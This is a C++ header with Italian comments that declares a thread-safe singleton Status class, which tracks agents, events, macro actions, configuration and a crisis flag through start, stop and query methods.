#include "Common.h"
#include <string>
#include <exception>
using namespace std;

#ifndef __Status_h__
#define __Status_h__

#define MAX_WAIT_TIME 1000 // Tempo massimo che attendiamo perche' un agente si fermi

class Status {
	private: map<UINT, AgentStruct> agents;
	private: map<pair<UINT, UINT>, EventStruct> events;
	private: map<UINT, MacroActionStruct> actions;
	private: list<ConfStruct> config;
	private: UINT uCrisis;
	private: static Status *Instance;
	private: static volatile LONG lLock;

	/**
	 * Semaforo per l'accesso alla lista degli eventi, e' pubblico per avere una scrittura/lettura atomica.
	 */
	public: HANDLE hEventsLock;

	/**
	* Semaforo per l'accesso alla lista delle azioni, e' pubblico per avere una scrittura/lettura atomica.
	*/
	public: HANDLE hActionsLock;

	/**
	 * Semaforo per l'accesso alla lista degli agenti, e' pubblico per avere una scrittura/lettura atomica.
	 */
	public: HANDLE hAgentsLock;

	/**
	* Semaforo per l'accesso alla struttura di configurazione.
	*/
	public: HANDLE hConfigLock;

	public: map<UINT, AgentStruct>& GetAgentsList();

	public: map<pair<UINT, UINT>, EventStruct>& GetEventsList();

	public: map<UINT, MacroActionStruct>& GetActionsList();

	/**
	* Torna un puntatore alla struttura che definisce i parametri di configurazione.
	*/
	public: list<ConfStruct> const& GetConfigStruct();

	/**
	* Costruttore di default
	*/
	private: Status();
	public: ~Status();

	/**
	* Status e' una classe singleton
	*/
	public: static Status* self();

	/**
	* Imposta a TRUE il flag di crisi.
	*/
	public: void StartCrisis(UINT uType);

	/**
	* Imposta a CRISIS_NONE il flag di crisi.
	*/
	public: void StopCrisis();

	/**
	 * Torna lo stato di crisi.
	 */
	public: UINT Crisis();

	/**
	 * Aggiunge un agente alla lista o ne aggiorna lo stato se l'agente gia' esiste. Torna TRUE se l'agente e' stato
	 * aggiunto/updatato, FALSE altrimenti.
	 */
	public: BOOL AddAgent(AgentStruct &pAgent);

	/**
	 * Aggiunge un evento alla lista o ne aggiorna lo stato se l'evento gia' esiste. Torna TRUE se l'evento e' stato
	 * aggiunto/updatato, FALSE altrimenti.
	 */
	public: BOOL AddEvent(EventStruct &pEvent);

	/**
	 * Aggiunge una lista di azioni alla lista, uMapKey e' la chiave della mappa e rappresenta l'ordine progressivo
	 * delle azioni da 0 a n. Torna TRUE se l'azione e' stata aggiunta, FALSE altrimenti.
	 */
	public: BOOL AddAction(UINT uMapKey, MacroActionStruct &pAction);

	/**
	 * Legge i parametri di configurazione dal file nella sezione "configurazione" e popola la ConfStruct. Torna TRUE
	 * se i dati sono stati aggiunti con successo, FALSE altrimenti.
	 */
	public: BOOL AddConf(ConfStruct &pConf);

	/**
	* Imposta ad AGENT_STOPPED lo stato dell'agente uAgentId. Torna TRUE se l'agente e' stato
	* stoppato, FALSE altrimenti. Questa funzione va chiamata solo dall'agente per comunicare
	* alla classe che il thread si e' davvero fermato. Questa funzione e' concorrente!
	*/
	public: BOOL ThreadAgentStopped(UINT uAgentId);

	/**
	* Comunica all'agente uAgentId che deve fermarsi. Questa funzione e' concorrente!
	*/
	public: BOOL StopAgent(UINT uAgentId);

	/**
	* Invia il comando di stop a tutti gli agenti attualmente attivi. Questa funzione e' concorrente!
	*/
	public: BOOL StopAgents();

	/**
	* Torna il numero di agenti attivi nel file di configurazione. Questa funzione e' concorrente!
	*/
	public: UINT CountEnabledAgents();

	/**
	* Imposta lo stato di uAgentId ad AGENT_ENABLED. Questa funzione e' concorrente!
	*/
	public: BOOL ReEnableAgent(UINT uAgentId);

	/**
	* Imposta lo stato di tutti gli agenti che sono AGENT_STOPPED in AGENT_ENABLED. 
	* Questa funzione e' concorrente!
	*/
	public: BOOL ReEnableAgents();

	/**
	* Torna TRUE se l'agente identificato da uAgentId deve fermarsi, FALSE altrimenti.
	* Questa funzione e' concorrente!
	*/
	public: BOOL AgentQueryStop(UINT uAgentId);

	/**
	* Controlla se uAgentId deve fermarsi, in caso imposta ad AGENT_STOPPED lo status,
	* resetta il command e torna TRUE, FALSE altrimenti. Questa funzione e' concorrente!
	*/
	public: BOOL AgentCheckAndStop(UINT uAgentId);

	/**
	* Ritorna lo stato di uAgentId. Questa funzione e' concorrente!
	*/
	public: UINT AgentQueryStatus(UINT uAgentId);

	/**
	* Imposta ad AGENT_RUNNING lo status di uAgentId, torna TRUE in caso di successo
	* FALSE altrimenti. Questa funzione e' concorrente!
	*/
	public: BOOL AgentAlive(UINT uAgentId);

	/**
	* Torna l'indirizzo della ThreadProc di uAgentId, 0 altrimenti.
	* Questa funzione e' concorrente!
	*/
	public: DWORD AgentGetThreadProc(UINT uAgentId);

	/**
	* Imposta la ThreadProc di un agente, torna TRUE se va a buon fine, FALSE altrimenti.
	* Questa funzione e' concorrente!
	*/
	public: BOOL AgentSetThreadProc(UINT uAgentId, PVOID pThreadRoutine);

	/**
	* Va chiamata prima della AgentGetParams() per verificare se l'agente e' presente nella
	* mappa. Torna TRUE se c'e', FALSE altrimenti. Questa funzione e' concorrente!
	*/
	public: BOOL IsValidAgent(UINT uAgentId);

	/**
	 * Torna la struttura con la configurazione dell'agente uAgentId. Se l'agente non viene trovato
	 * torna map::end. Questa funzione NON e' concorrente! 
	 */
	public: AgentStruct const& AgentGetParams(UINT uAgentId);

	/**
	* Imposta ad EVENT_RUNNING lo status di uEventId che ha associato l'azione uActionId, 
	* torna TRUE in caso di successo FALSE altrimenti. Questa funzione e' concorrente!
	*/
	public: BOOL EventAlive(pEventStruct pEvent);

	/**
	* Ritorna lo stato dell'evento descritto da pEvent. Questa funzione e' concorrente!
	*/
	public: UINT EventQueryStatus(pEventStruct pEvent);

	/**
	* Torna TRUE se l'evento identificato da uEventId e uActionId deve fermarsi, FALSE altrimenti.
	* Questa funzione e' concorrente!
	*/
	public: BOOL EventQueryStop(pEventStruct pEvent);

	/**
	* Invia il comando di stop a tutti gli eventi attualmente attivi. Questa funzione e' concorrente!
	*/
	public: BOOL StopEvents();

	/**
	* Richiede il trigger dell'azione uActionId associata all'evento uEventId 
	* torna TRUE in caso di successo FALSE altrimenti. Questa funzione e' concorrente!
	*/
	public: BOOL TriggerAction(UINT uActionId);

	/**
	* Imposta ad EVENT_STOPPED lo stato dell'evento uEventId. Torna TRUE se l'evento e' stato
	* stoppato, FALSE altrimenti. Questa funzione va chiamata solo dall'evento per comunicare
	* alla classe che il thread si e' davvero fermato. Questa funzione e' concorrente!
	*/
	public: BOOL ThreadEventStopped(pEventStruct pEvent);

	/**
	 * Svuota la lista degli agenti, degli eventi e delle azioni e tutti i puntatori allocati. 
	 * Torna TRUE se la funzione e' andata a buon fine, FALSE altrimenti. Non va usata prima di aver 
	 * fermato gli agenti!!!!
	 */
	public: BOOL Clear();
};

#endif
